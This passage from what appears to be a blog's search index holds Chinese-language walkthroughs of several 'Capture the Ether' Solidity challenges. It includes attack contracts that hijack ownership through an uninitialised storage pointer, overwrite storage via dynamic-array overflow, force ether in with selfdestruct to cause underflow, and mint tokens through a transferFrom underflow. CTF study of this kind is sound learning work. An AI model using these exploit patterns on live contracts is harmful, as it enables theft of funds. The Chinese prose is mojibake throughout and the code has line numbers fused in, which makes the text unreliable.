æœ‰ä¸€ä¸ªä¸ºæŒ‡æ˜å­˜å‚¨æ–¹å¼çš„å£°æ˜è¯­å¥Donation donationï¼Œè¿™ä¸ªç»“æ„ä½“çš„å£°æ˜é»˜è®¤æ˜¯ storage ç±»å‹çš„ï¼Œæ˜¯éœ€è¦ä¸Šé“¾çš„ï¼Œå½“è°ƒç”¨æ­¤å‡½æ•°çš„æ—¶å€™ï¼Œä¼šè¦†ç›–å…¶ä»–å…¨å±€å˜é‡çš„æ’æ§½ã€‚ 2.3 è¿™æ°å¥½ä¸ºæˆ‘ä»¬ç¯¡æ”¹åˆçº¦æ‰€æœ‰æƒæä¾›äº†å¯èƒ½æ€§ï¼Œåªè¦å°† slot1ä½ç½®çš„å€¼è¦†ç›–ä¸ºæˆ‘ä»¬è‡ªå·±çš„è´¦æˆ·åœ°å€å³å¯æˆåŠŸæ‰§è¡Œwithdrawå‡½æ•°äº† 2.4 éœ€è¦åœ¨ donate å‡½æ•°ä¸­ä¿®æ”¹ slot1çš„å€¼ï¼Œé€šè¿‡ç®€å•çš„æ•°å­¦è®¡ç®—å°±å¯ä»¥äº† æˆ‘ä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘çš„è¿™ä¸ªæ”»å‡»åˆçº¦ä¸è¡Œ 1234567891011121314151617181920212223242526272829contract Hack &#123; DonationChallenge challenge; uint256 public etherAmount; function Hack(DonationChallenge _challenge) public &#123; challenge = _challenge; &#125; function computer(uint256 _address) public returns(uint256) &#123; // è®°å½•ä¸‹æˆ‘çš„åœ°å€ï¼Œå¹¶èµ‹å€¼ç»™etherAmountï¼Œæ–¹ä¾¿å‡½æ•°çš„è°ƒç”¨ etherAmount = _address; //ç®—å‡ºæˆ‘è¦æ”¯ä»˜å¤šå°‘wei return (_address / (10 ** 36)); &#125; function att() public payable &#123; //ä¿®æ”¹slot1 å³ ownerçš„å€¼ challenge.donate(etherAmount); // å·é’± challenge.withdraw; &#125; function getAddress() external view returns(address) &#123; return msg.sender; &#125;&#125; tipsï¼šé—®äº†åŒå­¦æ‰çŸ¥é“åŸå› ï¼šâ‘ æ˜¯å› ä¸ºæ²¡ç»™é¢˜ç›®åˆçº¦ä¸­çš„donateå‡½æ•°å‘é€ä¸»å¸ï¼Œè¿‡ä¸äº†donationä¸­çš„è¯­å¥ â‘¡withdrawå‡½æ•°ä¸­çš„ require(msg.sender == owner);æ ¡éªŒè¿‡ä¸å»ï¼Œå› ä¸ºåœ¨æ™ºèƒ½åˆçº¦ä¸­ï¼Œè°è°ƒç”¨withdrawï¼Œè°å°±æ˜¯msg.sender;åˆçº¦è°ƒç”¨ï¼Œé‚£ä¹ˆmsg.senderå°±æ˜¯åˆçº¦ è¿™æ ·ä¸€æ¥ challenge.withdraw; ä¸­çš„msg.senderå°±æ˜¯ challengeï¼Œæ‰€ä»¥å°±ä¼šæŠ¥é”™ åœ¨0.4çš„ç¼–è¯‘å™¨ä¸­å‘é€ä¸»å¸çš„æ–¹å¼æ˜¯ï¼š challenge.donate.value(msg.value)(etherAmount); 12345678function att() public payable &#123; //ä¿®æ”¹slot1 å³ ownerçš„å€¼ //// address(nameReg).call.value(1 ether)(abi.encodeWithSignature(&quot;register(string)&quot;, &quot;MyName&quot;)); challenge.donate.value(msg.value)(etherAmount); // å·é’± // challenge.withdraw; &#125; è¿™æ ·æ”¹å°±å¯ä»¥æˆåŠŸä¿®æ”¹åˆçº¦çš„æ‰€æœ‰è€…äº† 3. è§£é¢˜ 3.1 éƒ¨ç½² DonationChallenge å’Œ Hack åˆçº¦ 3.2 æ”»å‡»ä¹‹å‰ï¼Œå¯ä»¥çœ‹åˆ°åˆçº¦æ‰€æœ‰è€…ä¸æ˜¯æœ¬äºº 3.3 è®¡ç®—å‡ºæˆ‘éœ€è¦æ”¯ä»˜çš„è´¹ç”¨ï¼Œå‚æ•°æ˜¯æˆ‘çš„è´¦æˆ·åœ°å€ 3.4 ä»¥æˆ‘çš„è´¦æˆ·åœ°å€ä¸ºå‚æ•°ï¼Œè®¡ç®—ç»“æœä¸º msg.value è°ƒç”¨ Donation å‡½æ•°ï¼Œå†æ‰§è¡Œ withdrawnå‡½æ•°ï¼Œå°†é’±å–èµ°ï¼Œå†éªŒè¯isCompleteçš„å€¼ æˆåŠŸ","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Mapping","slug":"Smart contracts/capther the ether/Mapping","date":"2023-04-13T07:20:10.000Z","updated":"2023-04-13T07:20:10.000Z","comments":true,"path":"2023/04/13/Smart contracts/capther the ether/Mapping/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/13/Smart%20contracts/capther%20the%20ether/Mapping/","excerpt":"","text":"Mapping1. é¢˜ç›® 1.1 Who needs mappings? Iâ€™ve created a contract that can store key&#x2F;value pairs using just an array. 1.2 æºç ï¼š 12345678910111213141516171819pragma solidity ^0.4.21;contract MappingChallenge &#123; bool public isComplete; uint256[] map; function set(uint256 key, uint256 value) public &#123; // Expand dynamic array as needed if (map.length &lt;= key) &#123; map.length = key + 1; &#125; map[key] = value; &#125; function get(uint256 key) public view returns (uint256) &#123; return map[key]; &#125;&#125; 2. åˆ†æ 2.1 æœ€å¼€å§‹é¢˜ç›®æˆ‘æ˜¯ä¸ç†è§£çš„ï¼Œä¸Šç½‘æœäº†ä¸€ä¸‹ä¹‹åæ‰çŸ¥é“ï¼Œæ˜¯è¦è®© isComplete çš„å€¼è¿”å›çš„ æ˜¯ true ï¼Œä½†æ˜¯æˆ‘æ˜¯æ— ä»ä¸‹æ‰‹çš„ï¼Œæºç ä¸­æ²¡æœ‰æä¾›ä¿®æ”¹ isComplete å€¼çš„å‡½æ•° 2.2 å»ç½‘ä¸Šæœç´¢è§£é¢˜è¿‡ç¨‹çš„æ—¶å€™ï¼Œçœ‹åˆ°äº†è¯´åªè¦è®©åŠ¨æ€æ•°ç»„ map æº¢å‡ºå°†åŸæ¥ isComplete æ‰€å¤„çš„ slot0ä½ç½® ç»™è¦†ç›–å³å¯å°† æœªèµ‹å€¼çš„ isComplete çš„å€¼è½¬åŒ–ä¸º trueï¼ˆè¿™é‡Œè¿˜æ˜¯ä¸å¤ªç†è§£çš„ï¼‰ 2.3 çŸ¥é“æ€ä¹ˆåšä¹‹åå°±å¯ä»¥åˆ†æå¦‚ä½•å®ç°æ•°ç»„çš„æº¢å‡º a. ä¸€ä¸ªåˆçº¦çš„å­˜å‚¨æœ€å¤§å®¹é‡å¯ä»¥çœ‹æˆæ˜¯ä¸€ä¸ªéå¸¸å¤§çš„æ•°ç»„ï¼Œæœ€åˆå…¨æ˜¯é›¶ã€‚æ•°ç»„ä¸­çš„æ¯ä¸ªå€¼éƒ½æ˜¯ 32 å­—èŠ‚å®½ï¼Œå¹¶ä¸”æœ‰ 2 ^256ä¸ªè¿™æ ·çš„å€¼ã€‚ç®€å•æ¥è¯´å°±æ˜¯æœ‰ 2^256 ä¸ª key , æ¯ä¸€ä¸ªkeyå¯ä»¥è£…ä¸‹ 32bytesï¼ˆ1uint &#x3D; 1uint256&#x3D;1bytes32&#x3D;32bytesï¼‰é¢˜ç›®è¯´æ˜äº†map æ˜¯uint256 ç±»å‹çš„æ•°ç»„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œmap æ•°ç»„ä¸­çš„æ¯ä¸€å…ƒç´ å ç”¨ä¸€ä¸ªslotï¼Œè¿™å°±è¯´æ˜å¯ä»¥ä¸ç”¨è€ƒè™‘å‡ ä¸ªå…ƒç´ æŒ¤åœ¨ä¸€ä¸ªslotçš„æƒ…å†µäº† b. åŠ¨æ€æ•°ç»„åœ¨EVMä¸Šå­˜å‚¨çš„ä½ç½®å¾ˆå¤æ‚ï¼Œä»–ä¼šæ ¹æ®ä½ åŠ¨æ€æ•°ç»„å£°æ˜çš„ä½ç½®ï¼Œå³ slotçš„ä½ç½®è¿›è¡Œhashè®¡ç®—å‡ºç´¢å¼•0å®é™…å­˜å‚¨çš„ä½ç½®ï¼Œä»è€Œå¼€è¾Ÿä¸€æ®µè¿ç»­çš„ç©ºé—´ç”¨äºå­˜å‚¨æ•°æ®å…ƒç´ ï¼Œ å‚è€ƒæ–‡çŒ® c. åˆå› ä¸ºæ•°ç»„æº¢å‡ºä¹‹åï¼Œåˆä¼šä»EVMçš„è™šæ‹Ÿæ•°ç»„ä»ç´¢å¼•ä¸º0çš„ä½ç½®ï¼ˆå³slot0ï¼‰å¼€å§‹å­˜å‚¨ï¼Œå°±ä¼šè¦†ç›–åŸæ¥åˆçº¦ä¸­çš„æ•°æ®ï¼ˆå³isCompleteï¼‰ï¼Œ***æ•°ç»„çš„èµ·å§‹ä½ç½®æ˜¯é€šè¿‡keccak256(bytes32(â€œæ•°ç»„é•¿åº¦æ‰€åœ¨æ’æ§½â€))è®¡ç®—*** d. è®¡ç®— slot0 çš„ä½ç½® ï¼š 12 ** 256 - 1 - uint256(keccak256(slot)) + 1 2.4 æ”»å‡»åˆçº¦ï¼š 123456789101112131415161718192021222324252627contract Hack &#123; MappingChallenge challenge; function Hack(MappingChallenge _challenge) public &#123; challenge = _challenge; &#125; function att(uint256 slot) public&#123; // è®¡ç®—å‡ºmap[0]è¢«hashååˆ†é…çš„ä½ç½® uint start = uint256(keccak256(slot)); //è®¡ç®—å‡ºstart åˆ°EVMæ•°ç»„æœ«å°¾çš„é•¿åº¦ // 2 ** 256 - 1 ==&gt;&gt; æ˜¯EVMæ•°ç»„çš„é•¿åº¦ [0,2 ** 256 - 1] uint length = 2 ** 256 - 1 - start; // æ­¤æ—¶start + length åº”è¯¥æ˜¯ç­‰äº 2 ^ 256 // éªŒè¯äº†çŒœæƒ³ // return start + length; // å› ä¸º 2 ** 256 - 1 + 1 = 0 // return length + 1; challenge.set(length+1, 1); &#125;&#125; 3. è§£é¢˜ 3.1 éƒ¨ç½² MappingChallengeåˆçº¦ï¼Œéƒ¨ç½² Hack åˆçº¦ 3.2 å°†map æ‰€å¤„çš„æ’æ§½ä½ç½®ä½œä¸ºå½¢å‚ï¼Œè°ƒç”¨attå‡½æ•° 3.3 å›åˆ° MappingChallenge åˆçº¦ä¸­æŸ¥çœ‹ isCompleteçš„å€¼å·²ç»å˜æˆäº†true","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Retirement fund","slug":"Smart contracts/capther the ether/Retirement fund","date":"2023-04-13T06:58:10.000Z","updated":"2023-04-13T06:58:10.000Z","comments":true,"path":"2023/04/13/Smart contracts/capther the ether/Retirement fund/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/13/Smart%20contracts/capther%20the%20ether/Retirement%20fund/","excerpt":"","text":"Retirement fund1. é¢˜ç›® 1.1 This retirement fund is what economists call a commitment device. Iâ€™m trying to make sure I hold on to 1 ether for retirement. Iâ€™ve committed 1 ether to the contract below, and I wonâ€™t withdraw it until 10 years have passed. If I do withdraw early, 10% of my ether goes to the beneficiary (you!). I really donâ€™t want you to have 0.1 of my ether, so Iâ€™m resolved to leave those funds alone until 10 years from now. Good luck! ç¿»è¯‘ï¼š è¿™ä¸ªé€€ä¼‘åŸºé‡‘å°±æ˜¯ç»æµå­¦å®¶æ‰€è¯´çš„æ‰¿è¯ºæœºåˆ¶ã€‚æˆ‘æ­£åœ¨åŠªåŠ›ç¡®ä¿æˆ‘åœ¨é€€ä¼‘æ—¶ä¿ç•™ 1 ä¸ªä»¥å¤ªå¸ã€‚ æˆ‘å·²ç»å‘ä¸‹é¢çš„åˆçº¦æ‰¿è¯ºäº† 1 ä¸ªä»¥å¤ªå¸ï¼Œå¹¶ä¸”åœ¨ 10 å¹´è¿‡å»ä¹‹å‰æˆ‘ä¸ä¼šæ’¤å›å®ƒã€‚å¦‚æœæˆ‘ææ—©é€€å‡ºï¼Œæˆ‘çš„ 10% çš„ä»¥å¤ªå¸ä¼šæµå‘beneficiaryï¼ˆä½ ï¼ï¼‰ã€‚ æˆ‘çœŸçš„ä¸æƒ³è®©ä½ æ‹¥æœ‰æˆ‘çš„ 0.1 ä¸ªä»¥å¤ªå¸ï¼Œæ‰€ä»¥æˆ‘å†³å®šåœ¨ 10 å¹´åå†å•ç‹¬ä½¿ç”¨è¿™äº›èµ„é‡‘ã€‚ç¥ä½ å¥½è¿ï¼ 1.2 æºç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142pragma solidity ^0.4.21;contract RetirementFundChallenge &#123; uint256 startBalance; address owner = msg.sender; address beneficiary; uint256 expiration = now + 10 years; function RetirementFundChallenge(address player) public payable &#123; require(msg.value == 1 ether); beneficiary = player; startBalance = msg.value; &#125; function isComplete() public view returns (bool) &#123; return address(this).balance == 0; &#125; function withdraw() public &#123; require(msg.sender == owner); if (now &lt; expiration) &#123; // early withdrawal incurs a 10% penalty msg.sender.transfer(address(this).balance * 9 / 10); &#125; else &#123; msg.sender.transfer(address(this).balance); &#125; &#125; function collectPenalty() public &#123; require(msg.sender == beneficiary); uint256 withdrawn = startBalance - address(this).balance; // an early withdrawal occurred require(withdrawn &gt; 0); // penalty is what&#x27;s left msg.sender.transfer(address(this).balance); &#125;&#125; 2.åˆ†æ 2.1 é¢˜ç›®çš„è¦æ±‚æ˜¯å°†åˆçº¦çš„é’±å…¨éƒ¨å–èµ°ï¼Œè€Œä¸æ˜¯å–èµ°åˆçº¦æ‰€æœ‰è€…å‰©ä¸‹çš„é‚£ 0.1 ether 2.2 æ‰€ä»¥æˆ‘ä»¬å°†é‡ç‚¹å…³æ³¨ collectPenalty å‡½æ•°ï¼ŒæˆåŠŸæ‰§è¡Œmsg.sender.transfer(address(this).balance);è¿™è¡Œä»£ç ï¼›è€Œè¦æ‰§è¡Œè¿™è¡Œä»£ç æ‰§è¡Œè¦é€šè¿‡ä¸¤ä¸ªæ ¡éªŒã€‚æ ¡éªŒä¸€ï¼šrequire(msg.sender == beneficiary);éªŒè¯ä½ æ˜¯å¦æ˜¯å—ç›Šäººï¼Œ æ ¡éªŒäºŒï¼šwithdrawn = startBalance - address(this).balance &gt; 0 éªŒè¯åˆçº¦æ‰€æœ‰è€…æ˜¯å¦æå‰å–æ¬¾äº†ï¼Œæå‰å–æ¬¾å°±å¯ä»¥å¾€ä¸‹æ‰§è¡Œ 2.3 ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸‹æº¢çš„æ–¹æ³•è®© withdrawn çš„å€¼å¤§ 0ï¼Œå°±æ˜¯è®© address(this).balance çš„å€¼å¤§äº 1ehterï¼Œè€Œåˆçº¦ä¸­æ²¡æœ‰å¯ä»¥æ¥æ”¶ä¸»å¸çš„å‡½æ•°ï¼Œè¿™å°±éœ€è¦æˆ‘ä»¬ä½¿ç”¨ selfdestructå‘½ä»¤ï¼Œå°†æŸä¸ªåˆçº¦çš„é’±å¼ºè¡Œè½¬ç»™æŒ‡å®šåˆçº¦ 2.4 æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç¼–å†™ä¸€ä¸ªæ”»å‡»åˆçº¦ï¼Œå¾€åˆçº¦ä¸­å‘é€ä¸€ç‚¹ä¸»å¸ï¼Œå†æ‰§è¡Œè‡ªæ¯å‘½ä»¤ æ”»å‡»åˆçº¦ï¼š 12345678contract Hack &#123; function Hack(address _address) public payable &#123; // RetirementFundChallenge retiement = RetirementFundChallenge(_address); selfdestruct(_address); &#125;&#125; 3.è§£é¢˜ 3.1 éƒ¨ç½² RetirementFundChallengeåˆçº¦ 3.2 éƒ¨ç½² Hack åˆçº¦ï¼Œç»™ RetirementFundChallengeåˆçº¦ è½¬å…¥ 1 ether 3.3 è°ƒç”¨ collecPenaltå‡½æ•° æŸ¥çœ‹isCompleteçš„å€¼å˜æˆäº† true","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Token whale","slug":"Smart contracts/capther the ether/Token whale","date":"2023-04-13T06:01:10.000Z","updated":"2023-04-13T06:01:10.000Z","comments":true,"path":"2023/04/13/Smart contracts/capther the ether/Token whale/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/13/Smart%20contracts/capther%20the%20ether/Token%20whale/","excerpt":"","text":"Token whale1. é¢˜ç›® 1.1 è¦æ±‚ï¼š This ERC20-compatible token is hard to acquire. Thereâ€™s a fixed supply of 1,000 tokens, all of which are yours to start with. Find a way to accumulate at least 1,000,000 tokens to solve this challenge 1.2 æºç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455pragma solidity ^0.4.21;contract TokenWhaleChallenge &#123; address player; uint256 public totalSupply; mapping(address =&gt; uint256) public balanceOf; mapping(address =&gt; mapping(address =&gt; uint256)) public allowance; string public name = &quot;Simple ERC20 Token&quot;; string public symbol = &quot;SET&quot;; uint8 public decimals = 18; function TokenWhaleChallenge(address _player) public &#123; player = _player; totalSupply = 1000; balanceOf[player] = 1000; &#125; function isComplete() public view returns (bool) &#123; return balanceOf[player] &gt;= 1000000; &#125; event Transfer(address indexed from, address indexed to, uint256 value); function _transfer(address to, uint256 value) internal &#123; balanceOf[msg.sender] -= value; balanceOf[to] += value; emit Transfer(msg.sender, to, value); &#125; function transfer(address to, uint256 value) public &#123; require(balanceOf[msg.sender] &gt;= value); require(balanceOf[to] + value &gt;= balanceOf[to]); _transfer(to, value); &#125; event Approval(address indexed owner, address indexed spender, uint256 value); function approve(address spender, uint256 value) public &#123; allowance[msg.sender][spender] = value; emit Approval(msg.sender, spender, value); &#125; function transferFrom(address from, address to, uint256 value) public &#123; require(balanceOf[from] &gt;= value); require(balanceOf[to] + value &gt;= balanceOf[to]); require(allowance[from][msg.sender] &gt;= value); allowance[from][msg.sender] -= value; _transfer(to, value); &#125;&#125; 2. åˆ†æ 2.1 é¦–å…ˆå¯¹ä»£ç è¿›è¡Œè§£è¯»ï¼Œæ…¢æ…¢çœ‹æ‡‚ä»£ç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778pragma solidity ^0.4.21;contract TokenWhaleChallenge &#123; address player; uint256 public totalSupply; mapping(address =&gt; uint256) public balanceOf; mapping(address =&gt; mapping(address =&gt; uint256)) public allowance; string public name = &quot;Simple ERC20 Token&quot;; string public symbol = &quot;SET&quot;; uint8 public decimals = 18; function TokenWhaleChallenge(address _player) public &#123; player = _player; // å‘è¡Œé‡æ˜¯ 1000 totalSupply = 1000; // åˆå§‹åŒ–ç©å®¶çš„ä»£å¸ä¸º 1000 balanceOf[player] = 1000; &#125; // é€šå…³è¦æ±‚ï¼šéœ€è¦ç©å®¶çš„ä»£å¸ &gt;= 1000000 function isComplete() public view returns (bool) &#123; return balanceOf[player] &gt;= 1000000; &#125; // è§¦å‘äº‹ä»¶ è°å‘è°è½¬äº†å¤šå°‘ value event Transfer(address indexed from, address indexed to, uint256 value); //å†…éƒ¨çš„ å‘é€å‡½æ•° -- å°†åˆçº¦è°ƒç”¨è€…çš„ä»£å¸è½¬ç§»ç»™ æ¥æ”¶æ–¹to function _transfer(address to, uint256 value) internal &#123; // è¿™é‡Œå‡çš„æ˜¯ åˆçº¦è°ƒç”¨è€…çš„ä»£å¸ // åªè¦è¿™é‡Œçš„msg.sender ä¸æ˜¯ åŒä¸€ä¸ªåœ°å€ï¼Œé‚£ä¹ˆé¢„é˜²ä¸äº†æº¢å‡ºè¿™ä¸ªæ¼æ´ balanceOf[msg.sender] -= value; // è¿™é‡Œè¦æ³¨æ„ balanceOf[to] += value; emit Transfer(msg.sender, to, value); &#125; // å¤–éƒ¨çš„äº¤æ˜“å‡½æ•°ï¼Œå°†è°ƒç”¨è€…çš„ä»£å¸å‘é€ç»™æ¥æ”¶è€…to function transfer(address to, uint256 value) public &#123; // ç¡®ä¿è°ƒç”¨è€…çš„é’±è¶³å¤Ÿå‘é€ require(balanceOf[msg.sender] &gt;= value); // è¿™ä¸ªæ˜¯ï¼Ÿï¼Ÿï¼Ÿï¼Ÿä¸ºäº†é˜²æ­¢ä¸Šæº¢ï¼Ÿï¼Ÿï¼Ÿ require(balanceOf[to] + value &gt;= balanceOf[to]); _transfer(to, value); &#125; event Approval(address indexed owner, address indexed spender, uint256 value); // æˆæƒé¢åº¦ function approve(address spender, uint256 value) public &#123; allowance[msg.sender][spender] = value; emit Approval(msg.sender, spender, value); &#125; function transferFrom(address from, address to, uint256 value) public &#123; // æ£€æŸ¥çš„æ˜¯ from è¿™ä¸ªåœ°å€çš„ä»£å¸ // å®‰å…¨éšæ‚£ï¼šç›¸å½“äº å°ç‹å’Œå°æï¼Œåªè¦å°ç‹æœ‰é’±æˆ‘å°±å¯ä»¥ä¸€ç›´ä»å°æé‚£é‡Œå–é’± require(balanceOf[from] &gt;= value); // è¿™ä¸ªæ ¡éªŒå¾ˆå®¹æ˜“é€šè¿‡ï¼Œæˆ‘æ„Ÿè§‰æ˜¯åªè¦ä¸å¼„æº¢å‡ºå°±æ²¡äº‹ require(balanceOf[to] + value &gt;= balanceOf[to]); // è°ƒç”¨ approveå‡½æ•°ï¼Œè®© from ç»™åˆçº¦è°ƒç”¨è€…æˆæƒ require(allowance[from][msg.sender] &gt;= value); allowance[from][msg.sender] -= value; // è®©to å’Œ msg.senderä¸ä¸€è‡´ï¼Œç ´è§£å®ƒé‚£ç®€ç®€å•å•çš„ä¿æŠ¤æªæ–½ï¼Œtoå¯ä»¥éšä¾¿ä¹±å¡«ä¸€ä¸ªåœ°å€ _transfer(to, value); &#125;&#125; 2.2 æœ¬é¢˜çš„ç›®æ ‡å°±æ˜¯ balanceOf[player] &gt;= 1000000 è€Œåˆçº¦ä¸­çš„ä»£å¸å‘è¡Œé‡åªæœ‰ 1000 é‚£ä¹ˆå¤šï¼Œæ˜¾ç„¶åªé€šè¿‡ç®€å•çš„è½¬è´¦æ“ä½œæ˜¯ä¸å¯èƒ½å®ç°çš„ï¼Œæ‰€ä»¥ï¼Œåªèƒ½å¾€æº¢å‡ºçš„æ–¹å‘å»æ€è€ƒ 2.3 è€Œåˆçº¦ä¸­èƒ½äº§ç”Ÿæº¢å‡ºçš„ä¸”æ¶‰åŠåˆ° balanceOf çš„åªæœ‰ _transfer å‡½æ•°ä¸­çš„ balanceOf[msg.sender] -= value; è¿™ä¸ªå¯ä»¥äº§ç”Ÿæº¢å‡ºï¼Œç”Ÿæˆå¾ˆå¤šå¾ˆå¤šä»£å¸ã€‚ 2.4 åˆçº¦ä¸­è°ƒç”¨æ­¤å†…éƒ¨å‡½æ•°çš„æ–¹æ³•åªæœ‰ transfer å’Œ transferFrom ã€‚ç»†çœ‹å¯çŸ¥ transfer å‡½æ•°ä¸­ æœ‰require(balanceOf[msg.sender] &gt;= value)æ£€éªŒï¼Œè¿™ä¸ªæ£€éªŒè®©è¿™ä¸ªå‡½æ•°å˜å¾—å®‰å…¨ï¼Œå› ä¸ºå®ƒå’Œ _transferå‡½æ•°ä¸­çš„balanceOf[msg.sender] -= value;çš„msg.sender ä¿æŒä¸€è‡´ï¼Œæ— æ³•è¿›è¡Œæº¢å‡ºæ“ä½œ 2.5 transferFrom åˆçº¦ä¸­æœ‰ä¸‰ä¸ªæ ¡éªŒ 12345678910// æ£€æŸ¥çš„æ˜¯ from è¿™ä¸ªåœ°å€çš„ä»£å¸ // å®‰å…¨éšæ‚£ï¼šç›¸å½“äº å°ç‹å’Œå°æï¼Œåªè¦å°ç‹æœ‰é’±æˆ‘å°±å¯ä»¥ä¸€ç›´ä»å°æé‚£é‡Œå–é’± require(balanceOf[from] &gt;= value); // è¿™ä¸ªæ ¡éªŒå¾ˆå®¹æ˜“é€šè¿‡ï¼Œæˆ‘æ„Ÿè§‰æ˜¯åªè¦ä¸å¼„æº¢å‡ºå°±æ²¡äº‹ require(balanceOf[to] + value &gt;= balanceOf[to]); // è°ƒç”¨ approveå‡½æ•°ï¼Œè®© from ç»™åˆçº¦è°ƒç”¨è€…æˆæƒ require(allowance[from][msg.sender] &gt;= value); 2.6 æˆ‘ä»¬å¯çŸ¥ï¼Œå®ƒæ ¡éªŒçš„æ˜¯from åœ°å€ ï¼Œä½†æ˜¯ _transfer åˆçº¦ä¸­æ“ä½œçš„æ˜¯ msg.sender è¿™å°±æœ‰äº†æ“ä½œç©ºé—´ï¼Œåªè¦åˆ«äººæœ‰é’±æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ ¡éªŒæ‰§è¡Œä»¥ä¸‹çš„ä¸€ç³»åˆ—æ“ä½œ å€¼å¾—æ³¨æ„çš„æ˜¯æ–¹æ³•çš„å½¢å‚çš„ to ä¸èƒ½å’Œå½“å‰çš„åˆçº¦è°ƒç”¨è€…ä¸€è‡´ï¼Œå¦åˆ™ä»–ä¼šè¢«_transferå‡½æ•°ä¸­çš„å°å°ä¿æŠ¤æœºåˆ¶ç»™è¿˜åŸå›å»çš„ï¼Œæˆ‘ä¹‹å‰å°±è¯•è¿‡ 3. è§£é¢˜ 3.1 ç»™å‡½æ•°å¡«å…¥å‚æ•° 3.2 é¦–å…ˆè¦é€šè¿‡ç¬¬ä¸€ä¸ªæ ¡éªŒï¼šå¯ä»¥ç”¨ç©å®¶åœ°å€ï¼ˆbalanceOf[play] &#x3D; 1000ï¼‰ä½œä¸º from ï¼Œè¿™æ ·å°±å¯ä»¥é€šè¿‡ç¬¬ä¸€ä¸ªæ ¡éªŒäº† 3.3 to éšä¾¿å¡«ä¸€ä¸ªåœ°å€å°±å¯ä»¥ï¼Œåªè¦ä¸å’Œmsg.sender æ˜¯åŒä¸€ä¸ªåœ°å€å°±è¡Œ 3.4 è¦é€šè¿‡ç¬¬äºŒä¸ªæ ¡éªŒï¼Œå°±éœ€è¦ allowance[from][msg.sender] &gt;= value ï¼Œæ‰€ä»¥éœ€è¦å…ˆè°ƒç”¨approve å‡½æ•°ï¼Œå°†è°ƒç”¨è€…åœ°å€åˆçº¦åˆ‡å› ç©å®¶åœ°å€ï¼Œspenderå°±æ˜¯ ä½ ç­‰ä¸‹è¦ä½¿ç”¨çš„msg.senderï¼Œç„¶åéšä¾¿æˆæƒï¼Œæˆ‘è¿™é‡Œæˆæƒä¸€å—é’±ï¼Œå› ä¸ºä¸€ä¸ªå¾ˆç®€å•æº¢å‡ºå°±æ˜¯ 0 - 1 3.5 è°ƒç”¨ä¹‹åï¼ŒæŸ¥çœ‹ balanceOf[msg.sender] 3.6 å†è°ƒç”¨ transfer å‡½æ•°ï¼Œä» msg.sender è½¬ é’± ç»™ ç©å®¶ player é€šè¿‡ï¼ï¼ï¼","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"solidityçš„æ•´æ•°æº¢å‡º","slug":"Solidity/Basic_Knowledge/solidityçš„æ•´æ•°æº¢å‡º","date":"2023-04-12T06:01:10.000Z","updated":"2023-04-12T06:01:10.000Z","comments":true,"path":"2023/04/12/Solidity/Basic_Knowledge/solidityçš„æ•´æ•°æº¢å‡º/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/12/Solidity/Basic_Knowledge/solidity%E7%9A%84%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/","excerpt":"","text":"solidityçš„æ•´æ•°æº¢å‡ºèµ„æ–™æ”¶é›†ä¸­ï¼šæ–‡ç« ä¸€","categories":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/categories/Solidity/"},{"name":"Basic_Knowledge","slug":"Solidity/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Solidity/Basic-Knowledge/"}],"tags":[{"name":"æ•´æ•°æº¢å‡º","slug":"æ•´æ•°æº¢å‡º","permalink":"https://biyouqiuqiu.com/tags/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/"}]},{"title":"Token sale","slug":"Smart contracts/capther the ether/Token sale","date":"2023-04-12T06:01:10.000Z","updated":"2023-04-12T06:01:10.000Z","comments":true,"path":"2023/04/12/Smart contracts/capther the ether/Token sale/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/12/Smart%20contracts/capther%20the%20ether/Token%20sale/","excerpt":"","text":"Token sale1. é¢˜ç›® 1.1 This token 